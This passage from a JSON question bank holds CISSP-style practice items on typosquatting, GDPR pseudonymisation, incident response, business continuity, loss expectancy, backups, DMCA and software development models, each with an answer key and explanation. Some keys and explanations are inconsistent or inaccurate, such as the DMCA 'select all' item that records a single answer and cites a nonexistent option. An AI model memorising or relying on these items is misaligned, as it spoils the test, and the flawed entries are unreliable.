      "stem": "A hacker was recently arrested for money laundering. In their confession, they mentioned that they registered many domains which looked like legitimate bank domains but with a few typos, and created fake websites impersonating the bank's website. Once a user logged into the fake website, the hacker used to capture their credentials and use them on the real website to launder money. What type of attack was the hacker conducting to trick the users?",
      "choices": [
        "Typosquatting",
        "Identity theft",
        "Man-in-the-middle attack",
        "Dumpster diving"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. Typosquatting is an attack where an attacker registers misspelled domains assuming users will mistype the legitimate Fully Qualified Domain Names (FQDNs). For example, attackers can register yaho.com or yaoho.com instead of the yahoo.com domain. This attack is used to trick users to give out their confidential information. Identify theft (2) is when an attacker impersonates an individual identity and uses it to phish other people. A man-in-the-middle attack (3) occurs when an attacker intercepts and modifies traffic in transit, claiming to be the original sender. In dumpster diving (4), the attacker literally goes through the dumped trash to find any sensitive or confidential information."
    },
    {
      "id": "d2-q51",
      "domain": "2. Asset Security",
      "stem": "An e-commerce business in Europe collects the personal information of its customers, with their permission, when they buy a product from its website. They want to grow their business and decide to collaborate with an advertising business to send targeted advertisements that promote assorted products. To comply with General Data Protection Regulation (GDPR) requirements, how should the e-commerce business share Personally Identifiable Information (PII) with the advertising firm?",
      "choices": [
        "The E-commerce company should send data using tokenization techniques",
        "The E-commerce company should anonymize the data",
        "The E-commerce company should use digital signatures to send the data",
        "The E-commerce company should pseudonymize the data using masking techniques"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. Pseudonymization refers to masking data with a different identity. This process reduces the chances of exposing personal information to attackers while keeping the user identity intact for the data processor and data controller. This is equivalent to using aliases to hide the customers' identities. Anonymization (2) is the process of de-identification of personal information. Unlike Pseudonymization, the data cannot be linked back to the original user. If the data is anonymized correctly, GDPR laws don't apply to it. Tokenization (1) is used to send credit card information to a data processor. It is a form of pseudonymization. Option 3 is not correct because digital signatures are mathematical algorithms commonly used to validate the integrity and/or authenticity of a message (for example a digital document, a credit card transaction, or an email.). The effectiveness of a digital signature is dependent on the technology applied in developing it."
    },
    {
      "id": "d2-q52",
      "domain": "2. Asset Security",
      "stem": "The CISO is concerned about proprietary information leaving the enterprise. They have decided to implement a Data Loss Prevention (DLP) program within the enterprise. What is the first step they should perform prior to implementing the DLP program?",
      "choices": [
        "Implement security controls",
        "Define classification levels",
        "Classify the data as per the criticality",
        "Select asset owner"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. Prior to implementing the DLP program, a data classification program should be implemented, and the first step to this is to create a formalized data classification policy defining the classification levels. Data owners and assets owners are appointed which then help to categorize and locate the data in an organization. Data owners assign the classification levels defined in the policy to the discovered data. Based on the classification level, security controls are implemented by data custodians. The controls are continuously monitored until the data is no longer required."
    },
    {
      "id": "d7-q74",
      "domain": "7. Security Operations",
      "stem": "A user reported an incident to the helpdesk stating that they cannot access files on their computers and are afraid that it might be a ransomware attack spreading across the network. What step should the helpdesk technician take immediately?",
      "choices": [
        "Document the incident and escalate it to the manager",
        "Isolate the user machine",
        "Contact the Incident response team",
        "Contact the user and verify the incident"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. The first step in Incident response (IR) is to detect the incident. In the described scenario, the user has reported the incident, but it has not been confirmed. The initial response should be to contact the user and verify the incident. After the incident is detected and confirmed, the next stage is to respond to the incident. In this stage, the severity of the incident is determined, and if the severity of the incident is high and not within the technician's scope, then the escalation model (in which the technician documents the incident and escalates it to the manager) must be followed. The next stage in the IR is to stop the malware from spreading by isolating the endpoint. If the malware has already infected multiple machines, then the manager contacts the IR team and reports the incident to senior management and other teams within the organization."
    },
    {
      "id": "d1-q90",
      "domain": "1. Security and Risk Management",
      "stem": "A junior software developer is creating an application and following the waterfall methodology. Their manager wants them to perform threat modeling in the design phase and implement the countermeasures in the development phase. What is the reason behind performing threat modeling in the design phase?",
      "choices": [
        "To reduce risk to an acceptable level",
        "To prioritize threats to critical assets",
        "To reduce the cost",
        "To prioritize threat events"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. The ultimate goal of threat modeling is to identify, categorize, and prioritize threats to critical assets. Threat modeling is used to identify threats during the design stage of the software and system development life cycle (SDLC). That helps in building security during the development phase. This minimizes the cost (3) and post-development efforts by reducing the possibility of having to patch the vulnerabilities after the software is deployed. Threat modeling is an iterative process and should be performed regularly to identify new threats to the asset. The goal of risk management is to reduce the risk to an acceptable level (1), it is also used in Business Impact Assessments (BIA) to help prioritize assets during Business Continuity Planning (BCP). Option 4 is not correct as Threat modeling does not prioritize threat events."
    },
    {
      "id": "d1-q91",
      "domain": "1. Security and Risk Management",
      "stem": "An MNC in Japan is getting a lot of backlash from its customers because of its slow website. This has started impacting its trading business. To address this problem, the senior management has decided to build a CDN server worth $500,000. Since Japan is an earthquake-prone country, it is expected to experience an earthquake every 6 months. The CDN facility is estimated to incur a 2% loss each time there is an earthquake. What is the Annual Loss Expectancy (ALE)?",
      "choices": [
        "20000",
        "2000",
        "10000",
        "40000"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. Asset value = $500,000. EF = 2%. Annual Rate of Occurrence (ARO) = 2 earthquakes per year. Single Loss Expectancy ( SLE) = Asset Value(AV) * Exposure Factor (EF) = $500,000 * 2% = $10,000 Annual Loss Expectancy (ALE) = SLE * ARO = $10,000 * 2 = $20,000 The Annual Loss Expectancy the facility will incur every year is $20,000."
    },
    {
      "id": "d7-q75",
      "domain": "7. Security Operations",
      "stem": "A data custodian is looking to implement a backup strategy as per the data owner's requirement. The data owner wants a full backup to be performed every Monday night, and in the event of a disaster, the data should be recoverable with a maximum of two backup tapes. What backup strategy should the custodian implement for the remaining days of the week?",
      "choices": [
        "Differential backup",
        "Database backup",
        "Incremental backup",
        "Full backup"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. Differential backup stores all files that have been changed since the time of the last backup. For example, if a full backup was performed on Monday night, then on Tuesday it will back up all the files from that day, the following day it will back up all the files that were changed on Tuesday and Wednesday, and so on. In contrast, incremental backups only back up files that have been changed since the last full or incremental backup. Differential backups only require two tapes to fully restore the data (one from the full backup and one from the day before the disaster). This minimizes the restoration time. Differential backups do not clear the archive bit and take longer to create. Incremental backups reset the archive bit and only take a short amount of time to create the tape."
    },
    {
      "id": "d2-q53",
      "domain": "2. Asset Security",
      "stem": "Who is ultimately responsible for security incidents within an enterprise?",
      "choices": [
        "CISO",
        "CEO",
        "CTO",
        "CIO"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. Senior management personnel are drivers of the company, and their decisions trickle down the organizational chart. The CEO holds the highest position in the company and reports directly to the board of directors and so is ultimately responsible for any security incidents or breaches within the company."
    },
    {
      "id": "d1-q92",
      "domain": "1. Security and Risk Management",
      "stem": "The Digital Millennium Copyright Act (DMCA) was enacted to ensure copyright owners' exclusive rights are safeguarded against infringement brought about by digital technologies like the internet. In order to be exempted from DMCA provisions, what must an Internet Service Provider (ISP) adhere to? (Select all that apply)",
      "choices": [
        "Transmission of copyright files should be initiated by a person, not the ISP",
        "Copyrighted information should be stored on the ISP network by a user",
        "The ISP should modify files to avoid DMCA fines",
        "The ISP should not define the recipient of the files"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "The correct answers are options 1, 2, and 4. The DMCA protects copyrighted information by prohibiting attempts to modify the controls put in place by the content creator. The DMCA was created especially to protect digital media distribution through CDs and DVDs. Non-profit organizations like schools and libraries are exempt from this provision. The DMCA considers ISPs as carriers of information, as such, they are exempt from this provision under the following conditions: • Transmission of copyrighted files should be initiated by a person, not the ISP. (option 1) • Copyrighted information is stored on the ISP network by an individual user. In this case, the ISP should promptly delete the content upon receiving a copyright infringement notification. (option 2) • The ISP should not modify any content before transmission. (Points out why option 3 is incorrect). • The ISP should not define the recipient of the files. (option 4). The other conditions include: • Intermediate copies should not be accessible to anyone other than the intended recipient. (Points out why option 5 is incorrect) • Transmission, routing, provision of connections, and/or copying must be performed through an automated process without selection of the content from the ISP."
    },
    {
      "id": "d1-q93",
      "domain": "1. Security and Risk Management",
      "stem": "A ransomware enterprise is targeting smaller financial institutions across the world. The CISO of a small financial enterprise is worried about this attack and is planning to create a business continuity plan (BCP) as a long-term solution for these types of cyberattacks. What is the first step the CISO must undertake to start planning the BCP?",
      "choices": [
        "Selecting the BCP team",
        "Identifying organizational departments",
        "Gaining senior Management Approval of the plan",
        "Conducting Risk Management"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. The first step in the BCP is to identify all the departments. This helps to determine the members of the BCP team and lays a good foundation for the rest of the BCP process. Conducting Risk Management (4) is a part of the Business Impact Assessment (BIA). Senior Management approval is taken after the BCP is designed and documented. It is not the first step."
    },
    {
      "id": "d7-q76",
      "domain": "7. Security Operations",
      "stem": "Enterprises often invite stakeholders to participate in the development of business continuity plans, drills, and disaster recovery strategies. As chief information security officer (CISO), you will be one of the stakeholders who will be engaging in the planning and execution of these business continuity tasks. Moreover, you will work with the incident response coordinator and team members to handle disasters. Which option will be the MOST appropriate ability to develop for when disasters strike your enterprise?",
      "choices": [
        "Developing a business continuity and disaster recovery plan (BCP/DRP)",
        "Working with stakeholders closely",
        "Coping with stressful situations",
        "Assessing the severity of disasters"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. Disasters are nerve-wracking situations and team members' ability to cope with stress goes a long way in containing it appropriately and in a timely manner. Moreover, staff members with this ability are more likely to choose to act according to recovery procedures instead of panicking. The other options are helpful in addressing the disaster, but the ability to deal with stress comes at the forefront when disasters strike. Development of BCP/DRP (1) is proactive activity and happens before disaster strikes your organization. Working with stakeholders (2) helps a lot but is not as crucial as stress management."
    },
    {
      "id": "d7-q77",
      "domain": "7. Security Operations",
      "stem": "A tech business has recently suffered an electrical fire disaster that caused damage to their datacenter. The Incident Response Team (IRT) that have been actively involved in the recovery procedure finally convened to reflect on the team's overall performance in addressing the disaster. What will be the primary output of the meeting?",
      "choices": [
        "Installing fire suppression and protection solutions",
        "Evaluating the performance of each member of the recovery team.",
        "Punishing the personnel who caused the fire",
        "Reporting the lessons learned"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. Once a disaster is under control, participating teams immediately meet to reflect on what went right and wrong during the execution of the recovery procedure. The ultimate purpose of the meeting is therefore to learn a lesson and improve the plan. Finger-pointing is neither appropriate nor helpful in disaster recovery processes. Deploying fire suppression and protection systems will happen proactively or will be the subject of improvements as part of the lessons learned. Moreover, the incident response team (IRT) will participate in incident detection, response, mitigation, reporting, recovery, and remediation phases, before meeting and summarizing the lessons learned report from the disaster."
    },
    {
      "id": "d7-q78",
      "domain": "7. Security Operations",
      "stem": "As part of the annual drilling exercise, an enterprise has activated all the resources and processes required to test the effectiveness of the Disaster Recovery Plan (DRP) the business recently established. It will require shutting down operations at the primary site and switching all operations to an alternate processing site. Moreover, all the employees will perform their duties from the recovery site during the test. What is the most appropriate option to evaluate the DRP described in this scenario?",
      "choices": [
        "Parallel testing",
        "Simulation testing",
        "Full interruption testing",
        "Structured walkthrough"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. Full interruption testing requires that services and systems in the primary site cease functioning and failover to the secondary site. As opposed to parallel and simulation testing, which requires both sites to remain running and functional, full interruption testing is the most realistic and disruptive. It completely stops the operations of the primary site. It is the most effective to uncover the weakness of the DRP as well. Structured walkthrough testing is less practical and depends on actually walking into, and inspecting, the locations mentioned in the plan."
    },
    {
      "id": "d7-q79",
      "domain": "7. Security Operations",
      "stem": "Enterprises prepare different recovery strategies proactively to minimize the impact and likelihood of disastrous events. The main purpose of these strategies is to keep key businesses functioning even during emergencies. The services and systems that will remain running in these situations will be the most critical ones, without which the enterprises cannot fulfill their missions. Moreover, it requires the involvement and contribution of all business units and stakeholders of the enterprise when it is established. What type of strategy most demonstrates the requirements outlined in this scenario?",
      "choices": [
        "Business impact analysis (BIA)",
        "Business continuity planning (BCP)",
        "Disaster recovery planning (DRP)",
        "Recovery Time Objective (RTO)"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. Business continuity planning (BCP) is a proactive measure and ultimately focuses on getting the business up and running despite disastrous situations. The other options are subsets of BCP. Business impact analysis (BIA) is a means to identify critical assets and their value to the organization and thereby select cost-effective safeguards for each. Disaster recovery planning (DRP) is the process of equipping the organization to restore all IT and information systems immediately after the disaster strikes. The recovery time objective (RTO) is concerned with the time requirements to restore the information systems of the organization after a disaster strikes."
    },
    {
      "id": "d7-q80",
      "domain": "7. Security Operations",
      "stem": "A business heavily depends on software systems to serve customers and they apply stringent security measures to protect the business. Consequently, it requires each software product to pass through the security assessment before it is allowed to run in the production environment. The senior system tester runs each software product and rigorously evaluates it in the test environment. Furthermore, they effectively restrict software from interacting with other systems in the environment to detect and correct possible security defects. Which option demonstrates the functionalities described in this scenario?",
      "choices": [
        "Blacklisting",
        "Sandboxing",
        "Using a Honeypot",
        "Whitelisting"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. Sandboxing is a technique of isolating and testing the behavior of software products before allowing interaction with other systems. The purpose is to detect and prevent defects early in the process of deploying software products and applications. A honeypot is a network traffic management and segmentation concept which has the same intent as sandboxing but in a different domain and thus is not the correct option. Whitelisting is a list of applications/services that can run in an environment and denies anything not on the list. Whitelisting and blacklisting are application attack detection and prevention measures. Whitelisting deals with restricting all applications but allowing those applications which are known and less malicious. It denies all applications by default and allows only a well-known list of applications and services. Blacklisting, on the other hand, works by allowing all applications and services but restricting or denying a list of applications and services that are believed to be malicious. It allows all applications and services by default and denies those known (i.e., blacklisted) to be of a malicious nature."
    },
    {
      "id": "d7-q81",
      "domain": "7. Security Operations",
      "stem": "An enterprise survived a major malware attack recently and applied its established incident response procedure to handle the situation. The incident response team remained composed and handled the incident superbly. Moreover, the team perfected each phase of the incident management plan as per the exercises rehearsed. Above all, the team conducted a robust root-cause analysis (RCA) and quickly restored all the systems affected by the incident. In which phase of the plan did the RCA task MAINLY occur?",
      "choices": [
        "Response",
        "Mitigation",
        "Remediation",
        "Recovery"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. Root-cause-analysis (RCA) plays a crucial role in unearthing the cause of incidents and restoring affected systems as quickly and reliably as possible. It mainly happens during the remediation phase of the incident management plan. The incident management plan incorporates detection, response, mitigation, reporting, recovery, remediation, and lessons learned phases. The response phase is where the triage and incident criticality identifications processes of the detected incident takes place. In the mitigation phase, the organization begins to contain and fix the incident. The recovery phase is concerned with restoring the affected operations depending on their criticalities and priorities."
    },
    {
      "id": "d7-q82",
      "domain": "7. Security Operations",
      "stem": "A systems engineer responsible for deploying and configuring critical systems and applications at a business is able to undertake most required tasks using a standard user account. They sporadically request elevated privileges to complete deployments as needed. The administrator often grants privileged access to the engineer as per the established procedures and revokes it when the deployment is complete. The administrator is PRIMARILY enforcing _________ principle?",
      "choices": [
        "Separation of duties (SoD)",
        "Least privilege",
        "Just-in-time (JIT)",
        "Need-to-know"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. Just-in-time (JIT) is a relatively new concept in information security and further enforces least privilege principles in a more granular fashion. Through the JIT principle, administrators are able to grant entities privileged access for a specific time interval only and revoke it when no longer needed. Separation of duties (SoD) is a means to minimize collusion among people and is a fraud prevention concept. Need-to-know is a subset of least privilege and requires entities to provide a compelling reason for access even to that which they have clearance to access"
    },
    {
      "id": "d7-q83",
      "domain": "7. Security Operations",
      "stem": "An enterprise has a manual log management system and the staff working as analysts complain about the stressful work environment. Even so, the program is not that effective in preventing incidents and detecting alerts generated by the systems and devices. As a result, the business has been a victim of cyberattacks that might have been avoidable if there were appropriate security controls in place. The business has lately approved a proposal to acquire a new control to address the security issues. Which option would be the MOST effective to address the requirements outlined in the scenario?",
      "choices": [
        "Intrusion detection system (IDS)",
        "Intrusion prevention system (IPS)",
        "Next-generation firewall",
        "Security information and event management (SIEM)"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. Security information and event management (SIEM) is a solution that delivers automated and centralized log collection, detection, analysis, aggregation and correlation, and incident response services to an organization. IDS/IPS solutions provide intrusion detection and prevention services and can be subsets of SIEM solutions. Firewalls, even next-generation ones, focus more on filtering incoming and outgoing traffic to an organization. They are not that effective for the requirements mentioned in the scenario description."
    },
    {
      "id": "d1-q94",
      "domain": "1. Security and Risk Management",
      "stem": "There is a notorious criminal hacker who employs different techniques to compromise businesses. They mostly use trusted websites to launch attacks and recently attacked a business by implanting carefully crafted malicious code in a trusted website they knew was frequented by the employees of the target enterprise. They employed a zero-day vulnerability to exploit one of the unpatched webservers of the business. Which option had the hacker MAINLY applied to attack the business?",
      "choices": [
        "Cross-site scripting (XSS)",
        "Watering hole attack",
        "Cross-site request forgery (CSRF)",
        "Buffer overflow"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. Watering hole attacks are social engineering attacks through which hackers exploit websites that targets frequently visit. However, unlike CSRF and XSS, it will not compromise and redirect victims to some other malicious page. The sites will only serve to aid the attacker in launching further researched attacks, such as inserting malware in the future. XSS (1) is a web attack that injects scripting code to exploit browsers. CSRF (3) is a web attack that relies on user sessions to launch attacks. Buffer overflow (4) attacks inject malicious code through inputs and try to compromise it."
    },
    {
      "id": "d3-q69",
      "domain": "3. Security Architecture and Engineering",
      "stem": "The chief security officer (CSO) of an enterprise received a report that details an increase in shoplifting in one of their stores. They arranged a meeting with the facility design engineer and ordered them to propose a mechanism to minimize the rampant incidents. The facility engineer in turn proposed, among many things, to reroute one of the roadways and cut all trees surrounding the store to enhance visibility. Which option is the MOST likely control the engineer is referring to?",
      "choices": [
        "Smart building management system (SBMS)",
        "Crime prevention through environmental design (CPTED)",
        "Security control and design architecture (SCADA)",
        "Closed Circuit Television (CCTV)"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. CPTED is a facility design concept that has the potential to influencing and discouraging intruders before they commit crimes like shoplifting. It employs landscape, terrain, lighting, roadways, bollards, etc. to minimize crimes. SBMS is an emerging design that focuses on automating building management activities. CCTV is a video surveillance system installed around facilities. SCADA is a distractor and has no meaning in this context."
    },
    {
      "id": "d7-q84",
      "domain": "7. Security Operations",
      "stem": "A business wants to develop Business Continuity Planning (BCP) and has called a meeting with all stakeholders to discuss the matter. Stakeholders almost reached an agreement about the overall content of the BCP. However, they could not reach a consensus on the testing requirements of the plan and were unable to set a value for the Maximum Tolerable Downtime (MTD) during contingency operations. Who is ultimately responsible for deciding the final value of MTD?",
      "choices": [
        "The chief information security officer (CISO)",
        "The business owner",
        "Senior Management",
        "The chief operations officer (COO)"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. Senior management generally makes decisions on the value of MTD. MTD is a business issue and business-related decisions ultimately fall under the responsibility threshold of senior leadership. Business owners (2) will help the senior management with availability issues but will not be the ultimate decision-makers. The CISO (1) and COO (4) may be part of the senior management but they will not decide on the matter individually."
    },
    {
      "id": "d1-q95",
      "domain": "1. Security and Risk Management",
      "stem": "A disgruntled cybersecurity professional is abusing his administrative privileges and leaking confidential information about the business on the dark web. Which canon of the ISC2 code of ethics is the employee VIOLATING?",
      "choices": [
        "Protect society, the commonwealth, and the infrastructure.",
        "Act honorably, honestly, justly, responsibly, and legally.",
        "Provide diligent and competent service to principals.",
        "Advance and protect the profession."
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. A disgruntled employee is harming the organization by not providing competent service to his employer. The third canon, Provide diligent and competent services to principals, talks about preserving the trust and privileges given by the organization to perform the duties. This canon also implies providing competent and unbiased services to the organization. The first canon, Protect society, the commonwealth, and the infrastructure, talks about maintaining the public's trust in information systems and protecting society from cyberattacks. Since the action of the disgruntled professional is not directly affecting society, this option is incorrect. The second canon, Act honorably, honestly, justly, responsibly, and legally, is the second-best answer after option 3. This canon talks about preserving integrity and providing honest service to the stakeholders. It talks about providing prudent service and avoiding any unnecessary conflicts that can trigger uncomfortable situations. The fourth canon, Advance and protect the profession, advises security professionals to remain up to date with new technologies and share the knowledge gained with the community."
    },
    {
      "id": "d3-q70",
      "domain": "3. Security Architecture and Engineering",
      "stem": "A quality assurance specialist is performing fuzz testing on a newly developed application. The application restarts every time an incorrect input is entered. What SECURITY concept has the developer implemented in the application?",
      "choices": [
        "Fail-soft",
        "Fail-secure",
        "Fail-open",
        "Fail-hard"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. In fail-secure, the application or system reboots or is completely shut down when it encounters an error. Fail-secure is a mechanism to protect and maintain the confidentiality and integrity of the application or system. An example of fail-secure could be the blue screen of death on a Windows computer. Fail-open protects the availability of the system by continuing the operation in the event of failure. For example, allowing traffic through a firewall when a system is in an error state, or opening all the doors of the building in an event of fire. A fail-soft system is similar to a fail-open system except that it shuts down the non-essential functions of the system in the event of failure. There is no such term as fail-hard."
    },
    {
      "id": "d3-q71",
      "domain": "3. Security Architecture and Engineering",
      "stem": "A new fire suppressant system is being installed in a warehouse facility. The facility has a history of catching fire, so the site safety officer recommends installing large pipes that will release a large volume of water in a short period of time to prevent fire from spreading across the facility. What TYPE of water suppression system is to be installed in this facility?",
      "choices": [
        "Wet pipe system",
        "Dry pipe system",
        "Deluge system",
        "Pre-action system"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. Wet pipe systems are commonly found in sprinkler systems. In this system, the pipes are always filled with water, so it requires closed sprinkler heads to prevent leakage. You cannot use this system in this scenario because the sprinkler heads open only when the temperature around them goes above the specified threshold. In other words, the sprinkler heads won’t all open at once, so it won’t prevent a fire from spreading in a highly combustible environment. In dry pipe systems, the pipes are filled with compressed gas and when the temperature around the sprinkler head rises, the valves open and the pipes get filled with water. Pipe sizes are usually small in this system to minimize the delay between sprinkler operation and water flow. Pre-action systems are generally installed around electronic devices. They are a combination of wet and dry pipe systems. This system starts with a dry pipe setup and when the temperature around the sprinkler heads rises above a certain threshold, the pipes are filled with water, but the valves remain closed. When the temperature rises further, the valves are opened, releasing the water. Deluge systems are similar to pre-action systems with a few significant differences. In a deluge system, all sprinkler heads open at once, releasing a large amount of water in a short period of time. They also employ larger pipes. This type of system is usually used in chemical facilities and aircraft hangers."
    },
    {
      "id": "d1-q96",
      "domain": "1. Security and Risk Management",
      "stem": "A new CTO recently joined a Fortune 500 business. During the senior management meeting with the IT department, they suggested the procurement of Zero Trust firewall technology from a niche vendor and shared a Gartner report outlining the product's capabilities. The decision was made in response to recurring security issues with malware and viruses. Wangshu, being a senior security architect, shared the proposal with his department for input. As part of the security analysis, what activity will Wangshu perform FIRST?",
      "choices": [
        "Contact the vendor and ask for a demo of the product.",
        "Perform a peer review of the product’s capabilities with colleagues and friends.",
        "Perform a risk analysis of the network security architecture.",
        "Contact the existing firewall vendor and share the report of security incidents."
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. The architecture is weak due to the poor design of security principles such as least privilege, network segregation, and privilege management. Only after a careful risk assessment exercise that identifies key security vulnerabilities can a proper control recommendation aligned with asset sensitivity and criticality levels be made. Option 1 is not correct since contacting the vendor requires establishing formal user and business security. This cannot be done without a proper risk assessment activity. Option 2 is not correct since their opinion is most likely biased and is not based upon objective facts and analysis. Option 4 is incorrect. Without a conclusive risk report, such a meeting would not be effective in addressing the real threats the network is facing."
    },
    {
      "id": "d5-q62",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "Adam, the CTO of the business, is proposing the use of hardware-based token authentication to upgrade the security of a banking application that currently relies on a server-based authentication technique. He is concerned about the recent IT audit report on NTP time sync issues on the network. Which choice of token technology would be an UNRELIABLE choice for such environments?",
      "choices": [
        "Static password tokens",
        "Synchronous tokens",
        "Asynchronous tokens",
        "Challenge-handshake protocol"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct since the server and token device must be synchronized with the same time base. option 1 is not correct as static password tokens don’t rely on synchronized time clocks. Option 3 is not correct as asynchronous tokens are based upon a random challenge as a test of authenticity. Option 4 is not correct as a challenge handshake is a protocol and not a specific technology."
    },
    {
      "id": "d8-q47",
      "domain": "8. Software Development Security",
      "stem": "A military enterprise wants to develop a new system to enhance night vision cameras. To do so, they have hired a software development business to develop this system using the System Development Life Cycle (SDLC). The business and the military enterprise are discussing high-level security requirements and identifying the level of classified data processed by this system. Which STAGE of the SDLC are they in?",
      "choices": [
        "Functional requirements",
        "Control specification development",
        "Conceptual definition",
        "Design review"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct because the conceptual definition is a high-level statement of purpose document wherein organizations discuss security requirements and identify the level of classified data that will be processed by the system. Option 1 is not correct because functional requirements are defined in detail after the conceptual definition is agreed upon. In this step, system functionalities are defined, and developers start thinking about how the components of the system will work together. Option 2 is not correct because, in control specification development, software developers will start designing the security and access control features. Option 4 is not correct because, in the design review process, all the stakeholders review the code specification and functional requirements to ensure the project is on track and all the functional requirements are met."
    },
    {
      "id": "d8-q48",
      "domain": "8. Software Development Security",
      "stem": "An e-commerce business wants to develop order processing software in-house. Due to the proprietary algorithm that will be used in this software, the business owner has classified this project as top secret. He has asked for periodic reviews of the working prototypes, built-in security, weekly progress status updates, and a cost-effective solution. The software development team is evaluating the development approach. Which option is the BEST software development model?",
      "choices": [
        "Waterfall model",
        "V-model",
        "Spiral model",
        "Agile scrum model"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct because, in the spiral model, working prototypes are presented after each iteration of the waterfall model. This spiral model focuses on a series of increasingly improving software iterations until a final product is completed. Risk assessment is performed during each iteration increasing the security posture of the software. Option 1 is not correct because the waterfall model delivers the product after the first iteration and does not allow working prototypes to be created after each stage. If there are any security issues, software developers will have to restart the entire model, making it time-consuming. Option 2 is not correct because, in the V-model, testing occurs after each stage of the waterfall model. It focuses on quality but is not a cost-effective solution. Option 4 is not correct because, in the agile scrum method, although at the end of each scrum (daily status meetings with the scrum master) a working prototype is presented, the team meets daily for scrum meetings and not weekly as stated in the question."
    },
    {
      "id": "d8-q49",
      "domain": "8. Software Development Security",
      "stem": "A software development business builds custom software for clients. Due to a lack of resources, the enterprise follows a basic lifecycle management process. Which maturity level BEST describes this business in terms of Capability Maturity Model Integration (CMMI)?",
      "choices": [
        "Initial stage",
        "Repeatable stage",
        "Defined stage",
        "Managed stage"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct because, in the repeatable stage, the company follows a basic life cycle management process and re-uses the code to gain the same functionality with a similar application. Option 1 is not correct because there are no defined processes in the initial stage, and everything works on an ad hoc basis. Option 3 is not correct because, at the defined level, software processes are well documented, and the developer follows a standard approach to gain similar results. Option 4 is not correct because, at the managed level, quantitative measures are developed to gain a detailed understanding of the processes."
    },
    {
      "id": "d8-q50",
      "domain": "8. Software Development Security",
      "stem": "A team of software developers is close to releasing software they have been working on for a few months. The Chief Information Security Officer (CISO) of the business wants to ensure security mechanisms are properly implemented as per the enterprise’s security policy. Which option processes will give the CISO CONFIDENCE that the software meets security requirements?",
      "choices": [
        "Acceptance",
        "Assurance",
        "Certification",
        "Accreditation"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct because assurance provides confidence that the software or system is built securely and is adhering to security policies. Assurance is continuously maintained, reviewed, and re-verified. Each system has a different level of assurance, and they are graded based on different levels of assurance. Option 1 is not correct because acceptance is given by the end-user after using the product or system. End-users/clients will use the product and verify whether the software or system meets their requirements. Option 3 is not correct because the certification process will prove to the CISO that the software meets both the business and security requirements. Option 4 is not correct because accreditation is senior management approval of the system or software after the certification process is complete."
    },
    {
      "id": "d8-q51",
      "domain": "8. Software Development Security",
      "stem": "The Security Operation Centre (SOC) team is having issues responding to the incidents generated by the monitoring systems. The team is understaffed, hence the manager has invested in a Security Orchestration, Automation, and Response (SOAR) solution that would help his team to respond to only the high-severity incidents and automate low- and medium-severity incidents. What should the SOC team develop PRIOR to automating the process?",
      "choices": [
        "Threat intelligence feed",
        "Runbook",
        "Playbook",
        "Baseline configuration"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
